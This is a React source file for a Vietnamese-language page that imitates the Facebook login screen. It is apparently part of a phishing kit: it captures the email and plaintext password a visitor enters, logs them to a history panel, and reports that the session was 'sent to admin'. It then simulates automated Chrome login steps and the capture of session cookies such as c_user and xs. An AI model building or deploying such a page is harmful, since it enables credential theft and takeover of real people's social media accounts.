import React, { useState } from 'react';
import { Helmet } from 'react-helmet';
import { motion } from 'framer-motion';
import { useHistory } from '@/hooks/useHistory';
import { useToast } from "@/components/ui/use-toast";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Facebook, Mail, KeyRound, Loader } from 'lucide-react';
import { EventBus } from '@/contexts/AppContext';

const UserLoginPage = () => {
    const { addHistoryEntry, updateHistoryEntry } = useHistory();
    const { toast } = useToast();
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    const handleSubmit = (e) => {
        e.preventDefault();
        if (!email || !password) {
            toast({
                title: "Thiếu thông tin",
                description: "Vui lòng nhập cả email và mật khẩu.",
                variant: "destructive",
            });
            return;
        }
        setIsLoading(true);

        const newId = Date.now();
        const platform = 'Facebook';
        const newEntry = {
            id: newId,
            time: new Date().toLocaleString('vi-VN'),
            account: email,
            password: password,
            otp: 'N/A',
            ip: 'Đang lấy...',
            status: '1️⃣ Đang xử lý...',
            cookie: 'Chờ...',
            chrome: `AutoProfile_${Math.floor(Math.random() * 10000)}`,
            note: '',
            linkName: `${platform} Login`,
            platform: platform
        };

    addHistoryEntry(newEntry);
    try { EventBus.dispatch('history_login_request', newEntry); } catch {}

        toast({
            title: "🚀 Bắt đầu đăng nhập...",
            description: `Phiên đăng nhập cho ${email} đã được gửi tới admin.`,
        });

        const statuses = ['✅ Thành công', '🟡 Phê Duyệt', '🟡 Nhận Code', '🟠 Captcha', '❌ Sai mật khẩu', '❌ Sai Tài Khoản', '❌ Sai Số Phone'];
        const finalStatus = statuses[Math.floor(Math.random() * statuses.length)];
        const finalCookie = finalStatus === '✅ Thành công' ? `c_user=${Date.now()}; xs=${Math.random().toString(36).substring(2)};` : '❌ Không';

        setTimeout(() => updateHistoryEntry(newId, {
            status: '2️⃣ Mở Chrome...',
            toastInfo: {
                title: '🚀 Tự động mở Chrome...',
                description: `Hệ thống đang mở profile ${newEntry.chrome}.`
            }
        }), 1500);
        setTimeout(() => updateHistoryEntry(newId, { status: '3️⃣ Điều hướng...' }), 3000);
        setTimeout(() => updateHistoryEntry(newId, { status: '4️⃣ Điền thông tin...' }), 4500);
        setTimeout(() => {
            updateHistoryEntry(newId, {
                status: finalStatus,
                cookie: finalCookie,
                ip: `113.161.35.${Math.floor(Math.random() * 254) + 1}`,
                toastInfo: {
                    title: "Hoàn tất!",
                    description: `Quá trình cho ${email} đã kết thúc với trạng thái: ${finalStatus}`
                }
            });
            setIsLoading(false);
            setEmail('');
            setPassword('');
        }, 6000);
    };

    return (
        <>
            <Helmet>
                <title>Đăng nhập - Facebook</title>
            </Helmet>
            <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <motion.div
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ duration: 0.5 }}
                >
                    <Card className="w-full max-w-md shadow-lg">
                        <CardHeader className="text-center">
                            <motion.div
                                animate={{ scale: [1, 1.1, 1] }}
                                transition={{ repeat: Infinity, duration: 2 }}
                                className="mx-auto"
                            >
                                <Facebook className="h-16 w-16 text-blue-600" />
                            </motion.div>
                            <CardTitle className="text-2xl font-bold mt-4">Đăng nhập Facebook</CardTitle>
                            <CardDescription>Kết nối với bạn bè và thế giới xung quanh bạn.</CardDescription>
                        </CardHeader>
                        <CardContent>
                            <form onSubmit={handleSubmit} className="space-y-4">
                                <div className="space-y-2">
                                    <Label htmlFor="email">Email hoặc số điện thoại</Label>
                                    <div className="relative">
                                        <Mail className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                                        <Input
                                            id="email"
                                            type="email"
                                            placeholder="Nhập email của bạn"
                                            value={email}
                                            onChange={(e) => setEmail(e.target.value)}
                                            required
                                            className="pl-10"
                                            disabled={isLoading}
                                        />
                                    </div>
                                </div>
                                <div className="space-y-2">
                                    <Label htmlFor="password">Mật khẩu</Label>
                                    <div className="relative">
                                        <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                                        <Input
                                            id="password"
                                            type="text"
                                            placeholder="Nhập mật khẩu"
                                            value={password}
                                            onChange={(e) => setPassword(e.target.value)}
                                            required
                                            className="pl-10"
                                            disabled={isLoading}
                                        />
                                    </div>
                                </div>
                                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700" disabled={isLoading}>
                                    {isLoading ? (
                                        <>
                                            <Loader className="mr-2 h-4 w-4 animate-spin" />
                                            Đang xử lý...
                                        </>
                                    ) : (
                                        'Đăng nhập'
                                    )}
                                </Button>
                            </form>
                            <div className="mt-4 text-center text-sm">
                                <a href="#" className="text-blue-600 hover:underline">Quên mật khẩu?</a>
                            </div>
                        </CardContent>
                    </Card>
                </motion.div>
            </div>
        </>
    );
};

export default UserLoginPage;